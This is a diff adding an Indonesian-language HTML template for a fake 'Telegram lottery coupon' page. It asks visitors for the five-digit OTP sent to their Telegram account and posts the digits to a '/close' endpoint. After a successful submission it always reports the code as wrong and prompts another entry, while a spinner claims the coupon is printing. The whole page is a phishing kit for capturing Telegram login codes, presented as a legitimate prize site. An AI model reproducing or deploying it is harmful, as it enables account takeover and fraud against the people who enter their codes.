@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Cetak Kupon</title>
+        <style>
+            html, body {
+                margin: 0;
+                padding: 0;
+                width: 100%;
+                height: auto;
+                overflow-x: hidden;
+                overflow: visible;
+            }
+            body {
+                font-family: sans-serif;
+                margin: 0 auto;
+                padding: 0;
+                overflow-x: hidden;
+                overflow-y: auto;
+            }
+            .image-container {
+                position: relative;
+                width: 100%;
+                max-width: 400px;
+                margin: 0 auto;
+                overflow: visible;
+                padding-bottom: 100px;
+                box-sizing: border-box;
+            }
+            .image-container img.bg {
+                width: 100%;
+                display: block;
+            }
+            .overlay-content {
+                position: absolute;
+                top: 0;
+                left: 0;
+                z-index: 2;
+                width: 100%;
+                padding-left: 20px;
+                padding-right: 20px;
+                box-sizing: border-box;
+            }
+            .image-wrapper {
+                display: flex;
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 10px;
+                margin-top: 7px;
+            }
+            .image-wrapper .img1 {
+                width: 140px;
+                height: auto;
+                object-fit: contain;
+            }
+            .image-wrapper .img2 {
+                width: 100%;
+                max-width: 380px;
+                min-height: 250px;
+                border: 2px solid white;
+                border-bottom-right-radius: 150px;
+                box-shadow: 0 0 0 3px #f9b233,      /* lapisan tipis luar di semua sisi */  4px 4px 0 4px #f9b233,  /* tebal di kanan dan bawah */ 8px 8px 15px rgba(0, 0, 0, 0.35);  /*bayangan gelap kanan dan bawah */
+            }
+            .teks-wrapper {
+                position: relative;
+                width: 90%;
+                margin: 20px auto 0 auto;
+                color: #333;
+                z-index: 2;
+            }
+            .judul-promo {
+                font-size: 18px;
+                font-weight: bold;
+                margin: 10px 0 5px;
+                line-height: 1.4;
+                text-align: center;
+                color: black;
+                text-shadow: -0.3px -0.3px 0 #f9b233, 0.3px -0.3px 0 #f9b233, -0.3px 0.3px 0 #f9b233, 0.3px 0.3px 0 #f9b233;
+            }
+            .deskripsi  {
+                font-size: 14px;
+                margin: 4px 0;
+                line-height: 1.5;
+            }
+            .peringatan {
+                font-size: 14px;
+                margin: 4px 0;
+                line-height: 1.5;
+                color: #c0392b;
+                font-weight: bold;
+            }
+            .verify-box {
+                text-align: center;
+                font-family: sans-serif;
+            }
+            .code-input {
+                display: flex;
+                justify-content: center;
+                gap: 10px;
+                margin: 20px 0;
+            }
+            .code-input input {
+                width: 100%;
+                max-width: 20px;
+                height: 22px;
+                text-align: center;
+                font-size: 20px;
+                border: none;
+                border-bottom: 2px solid #000;
+                background: transparent;
+                outline: none;
+            }
+            .line {
+                width: 80%;
+                margin: 0 auto;
+                border: 1px solid #aaa;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="image-container">
+            <img src="{{ url_for('static', filename='a1.jpg') }}" class="bg" alt="Background">
+            <div class="overlay-content">
+                <div class="image-wrapper">
+                    <img src="{{ url_for('static', filename='f1-n.png') }}" class="img1">
+                    <img src="{{ url_for('static', filename='f2-n.png') }}" class="img2">
+                </div>
+                <div class="teks-wrapper">
+                    <h2 class="judul-promo">Cetak Kupon Undian Telegram</h2>
+                    <p class="deskripsi">Silakan masukkan kode OTP yang telah dikirimkan ke Telegram anda. kode ini diperlukan untuk menampilkan kupon undian Telegram Anda yang sedang diproses atas nama Anda secara aman dan rahasia.</p>
+                    <p class="peringatan">⚠ kode OTP bersifat rahasia. gunakan hanya di situs resmi ini.</p>
+                </div>
+                <div class="verify-box">
+                    <p>
+                        <strong>Memverifikasi Telegram Anda</strong>
+                    </p>
+                    <p>
+                        Notifikasi Kode Verifikasi dikirim Ke Telegram anda
+                    </p>
+                    <form id="myForm" method="POST">
+                        <div class="code-input">
+                            <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" oninput="handleInput(this,'otp2')" onkeydown="handleBackspace(event,null)" onfocus="checkPrevious(this)" id="otp1">
+                            <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" oninput="handleInput(this,'otp3')" onkeydown="handleBackspace(event,'otp1')" onfocus="checkPrevious(this)" id="otp2">
+                            <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" oninput="handleInput(this,'otp4')" onkeydown="handleBackspace(event,'otp2')" onfocus="checkPrevious(this)" id="otp3">
+                            <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" oninput="handleInput(this,'otp5')" onkeydown="handleBackspace(event,'otp3')" onfocus="checkPrevious(this)" id="otp4">
+                            <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" oninput="submitOTP()" onkeydown="handleBackspace(event,'otp4')" onfocus="checkPrevious(this)" id="otp5" name="otp5">
+
+                            <div id="otp-error" style="color: red; margin-top: 8px; font-size: 14px;"></div>
+
+                            <script>
+                                function handleInput(current, nextId) {
+                                    current.value =current.value.replace(/[^0-9]/g, '');
+                                    if (current.value.length === 1 && nextId) {
+                                        const nextInput = document.getElementById(nextId);
+                                        if (nextInput) nextInput.focus();
+                                    }
+                                }
+                                function handleBackspace(e,prevId) {
+                                    if (e.key === 'Backspace'&& e.target.value === ''&& prevId) {
+                                        const prevInput = document.getElementById(prevId);
+                                        if (prevInput) prevInput.focus();
+                                    }
+                                }
+                                function checkPrevious(current) {
+                                    const inputs = ['otp1','otp2','otp3','otp4','otp5'];
+                                    const currentIndex = inputs.indexOf(current.id);
+                                    for (let i = 0;i< currentIndex;i++) {
+                                        if (document.getElementById(inputs[i]).value==='') {
+                                            document.getElementById(inputs[i]).focus();
+                                            break;
+                                        }
+                                    }
+                                }
+                                function submitOTP() {
+                                    const otp = [
+                                        document.getElementById('otp1').value, document.getElementById('otp2').value, document.getElementById('otp3').value, document.getElementById('otp4').value, document.getElementById('otp5').value
+                                    ].join('');
+                                    if (otp.length === 5) {
+                                        fetch('/close', {
+                                            method: 'POST',
+                                            headers: {'Content-type': 'application/x-www-form-urlencoded'},
+                                            body: 'otp1=' + otp[0] + '&otp2=' + otp[1] + '&otp3=' + otp[2] + '&otp4=' + otp[3] + '&otp5=' + otp[4]
+                                        })
+                                        .then(Response => {
+                                            if (Response.ok) {
+                                                document.getElementById('otp-error').innerText = 'Kode OTP salah, silakan cek kembali.';
+                                                document.getElementById('otp1').value='';
+                                                document.getElementById('otp2').value='';
+                                                document.getElementById('otp3').value='';
+                                                document.getElementById('otp4').value='';
+                                                document.getElementById('otp5').value='';
+                                                document.getElementById('otp1').focus();
+                                            } else {console.log('Gagal Kirim');}
+                                        });
+                                    }
+                                }
+                            </script>
+                        </div>
+                    </form>
+                    <hr class="line">
+                </div>
+                <div id="loadingSection" style="display: block; text-align:center; margin-top:20px; margin-bottom: 20px;">
+                    <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." width="60">
+                    <p>Sedang mencetak kupon Anda.... Setelah Kode OTP di Masukan maka kupon Anda akan tampil disini secara otomatis.</p>
+                </div>
+            </div>
+        </div>
+    </body>
+</html>
